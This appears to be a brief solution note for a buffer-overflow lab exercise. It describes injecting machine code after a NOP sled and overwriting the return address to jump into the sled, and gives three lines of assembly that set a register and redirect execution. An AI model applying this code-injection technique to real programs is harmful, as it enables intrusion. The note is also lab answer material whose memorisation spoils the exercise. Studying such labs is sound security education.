Solution: fish.txt

Idea: To pu the exploit code generated for machine code into the buffer after 
a no-op sled (a bunch of 90s). Then put the middlish of this sled as the return
address of the return address. This allows the code to be exectued after sliding
down to it through the sled.

Extra: exploit code
					movl $0x331f5edf, %eax
					push $0x00401256
					retq
